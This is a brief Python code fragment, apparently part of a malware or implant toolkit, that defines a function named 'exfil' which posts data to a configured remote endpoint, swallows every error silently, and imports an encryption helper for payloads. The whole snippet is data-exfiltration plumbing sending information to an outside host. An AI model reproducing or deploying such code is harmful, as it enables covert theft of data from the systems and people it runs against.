from core.crypto_ops import encrypt_payload
import requests
from config import CONFIG

def exfil(data):
    try:
        requests.post(CONFIG['https_endpoint'], data={"d": data}, timeout=5)
    except: pass